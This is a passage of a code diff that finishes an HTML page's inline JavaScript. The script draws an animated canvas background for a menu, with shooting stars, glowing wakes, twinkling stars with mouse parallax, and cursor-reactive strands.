+    for (let i = meteors.length - 1; i >= 0; i--){
+      const s = meteors[i];
+      s.x += s.vx; s.y += s.vy; s.life++;
+      s.trail.unshift([s.x, s.y]); if (s.trail.length > s.len) s.trail.pop();
+      // colour wake: soft glow blobs left behind that drift and fade
+      if (s.life % 3 === 0) wakes.push({ x: s.x, y: s.y, r: 26 + Math.random() * 26, a: .085 * s.bright, c: s.life % 6 ? s.c[0] : s.c[1], vx: s.vx * .04, vy: s.vy * .04 });
+      if (s.life > s.max || s.x < -300 || s.y > H + 300 || s.x > W + 300) meteors.splice(i, 1);
+    }
+    for (let i = wakes.length - 1; i >= 0; i--){
+      const w = wakes[i]; w.x += w.vx; w.y += w.vy; w.r += .55; w.a *= .972;
+      if (w.a < .003) wakes.splice(i, 1);
+    }
+  }
+
+  function spawnMeteor(){
+    // enter from the top / right edge, fly down-left at a shallow angle
+    const ang = (Math.PI * .72) + (Math.random() - .5) * .35;   // ~130 degrees
+    const sp = 7 + Math.random() * 6;
+    const fromTop = Math.random() < .65;
+    const x = fromTop ? W * (.25 + Math.random() * .85) : W + 20;
+    const y = fromTop ? -20 : H * Math.random() * .45;
+    meteors.push({ x, y, vx: Math.cos(ang) * sp, vy: Math.sin(ang) * sp, life: 0, max: 70 + Math.random() * 70,
+      len: 18 + Math.floor(Math.random() * 16), trail: [], bright: .7 + Math.random() * .3,
+      c: METEOR_COLORS[Math.floor(Math.random() * METEOR_COLORS.length)] });
+  }
+
+  function drawSky(){
+    // colour wakes (additive glow)
+    ctx.globalCompositeOperation = "lighter";
+    for (const w of wakes){
+      const g = ctx.createRadialGradient(w.x, w.y, 0, w.x, w.y, w.r);
+      g.addColorStop(0, "rgba(" + w.c + "," + w.a.toFixed(3) + ")"); g.addColorStop(1, "rgba(" + w.c + ",0)");
+      ctx.fillStyle = g; ctx.beginPath(); ctx.arc(w.x, w.y, w.r, 0, 6.283); ctx.fill();
+    }
+    ctx.globalCompositeOperation = "source-over";
+
+    // stars, with a little parallax toward the mouse
+    const px = mouse.on ? (mouse.x / W - .5) : 0, py = mouse.on ? (mouse.y / H - .5) : 0;
+    for (const st of stars){
+      const a = st.a * (.55 + .45 * Math.sin(t * .02 * st.tw + st.ph));
+      const x = st.x - px * 14 * st.z, y = st.y - py * 10 * st.z;
+      ctx.fillStyle = "rgba(" + st.tint + "," + a.toFixed(3) + ")";
+      ctx.beginPath(); ctx.arc(x, y, st.r, 0, 6.283); ctx.fill();
+    }
+
+    // shooting stars: tapered gradient tail + glowing head
+    ctx.globalCompositeOperation = "lighter";
+    ctx.lineCap = "round";
+    for (const s of meteors){
+      const fade = Math.min(1, s.life / 8) * Math.min(1, (s.max - s.life) / 20) * s.bright;
+      const tr = s.trail, n = tr.length;
+      for (let i = 1; i < n; i++){
+        const k = 1 - i / n;                                     // 1 at head -> 0 at tail end
+        const col = i < n * .25 ? "255,252,245" : (i < n * .6 ? s.c[0] : s.c[1]);
+        ctx.strokeStyle = "rgba(" + col + "," + (k * k * .9 * fade).toFixed(3) + ")";
+        ctx.lineWidth = .4 + k * 2.4;
+        ctx.beginPath(); ctx.moveTo(tr[i - 1][0], tr[i - 1][1]); ctx.lineTo(tr[i][0], tr[i][1]); ctx.stroke();
+      }
+      const hg = ctx.createRadialGradient(s.x, s.y, 0, s.x, s.y, 14);
+      hg.addColorStop(0, "rgba(255,255,255," + (.95 * fade).toFixed(3) + ")");
+      hg.addColorStop(.25, "rgba(" + s.c[0] + "," + (.45 * fade).toFixed(3) + ")");
+      hg.addColorStop(1, "rgba(" + s.c[0] + ",0)");
+      ctx.fillStyle = hg; ctx.beginPath(); ctx.arc(s.x, s.y, 14, 0, 6.283); ctx.fill();
+    }
+    ctx.globalCompositeOperation = "source-over";
+  }
+
+  function draw(){
+    ctx.clearRect(0, 0, W, H);
+    drawSky();
+    ctx.lineCap = "round";
+    // strands
+    for (const L of links){
+      const a = nodes[L.a], b = nodes[L.b];
+      const g = Math.max(a.glow, b.glow);
+      const depth = (a.depth + b.depth) / 2;
+      const alpha = BASE_A * depth + g * .34;
+      // rope sag: control point pushed sideways; wobbles more while disturbed
+      const mx = (a.x + b.x) / 2, my = (a.y + b.y) / 2;
+      const dx = b.x - a.x, dy = b.y - a.y, len = Math.hypot(dx, dy) || 1;
+      const wob = Math.sin(t * .05 + L.ph) * g * 9;
+      const s = L.sag * .6 + wob + 3;
+      const cx = mx - dy / len * s, cy = my + dx / len * s;
+      ctx.strokeStyle = "rgba(" + MILK + "," + alpha.toFixed(3) + ")";
+      ctx.lineWidth = .6 + depth * .5 + g * .6;
+      ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.quadraticCurveTo(cx, cy, b.x, b.y); ctx.stroke();
+    }
+    // knots
+    for (const n of nodes){
+      const a = BASE_A * 1.6 * n.depth + n.glow * .55;
+      ctx.fillStyle = "rgba(" + MILK + "," + a.toFixed(3) + ")";
+      ctx.beginPath(); ctx.arc(n.x, n.y, .9 + n.depth * .8 + n.glow * 1.4, 0, 6.283); ctx.fill();
+    }
+    // soft halo under the cursor
+    if (mouse.on){
+      const grd = ctx.createRadialGradient(mouse.x, mouse.y, 0, mouse.x, mouse.y, REACH);
+      grd.addColorStop(0, "rgba(" + MILK + ",.045)"); grd.addColorStop(1, "rgba(" + MILK + ",0)");
+      ctx.fillStyle = grd; ctx.beginPath(); ctx.arc(mouse.x, mouse.y, REACH, 0, 6.283); ctx.fill();
+    }
+  }
+
+  function loop(){
+    raf = 0;
+    if (!webActive || document.hidden) return;   // sleep when not on the menu
+    step(); draw();
+    raf = requestAnimationFrame(loop);
+  }
+  function kick(){ if (!raf && !reduce) raf = requestAnimationFrame(loop); }
+
+  addEventListener("pointermove", function(e){
+    if (mouse.on){ mouse.vx = e.clientX - mouse.x; mouse.vy = e.clientY - mouse.y; }
+    mouse.x = e.clientX; mouse.y = e.clientY; mouse.on = true;
+  }, { passive: true });
+  document.addEventListener("pointerleave", function(){ mouse.on = false; });
+  addEventListener("blur", function(){ mouse.on = false; });
+  document.addEventListener("visibilitychange", kick);
+  let rt; addEventListener("resize", function(){ clearTimeout(rt); rt = setTimeout(function(){ build(); if (reduce) draw(); }, 120); });
+
+  build();
+  if (reduce) draw(); else kick();
+  animateScreen(webActive ? "menu" : "");
+})();
+</script>
+
+</body>
+</html>
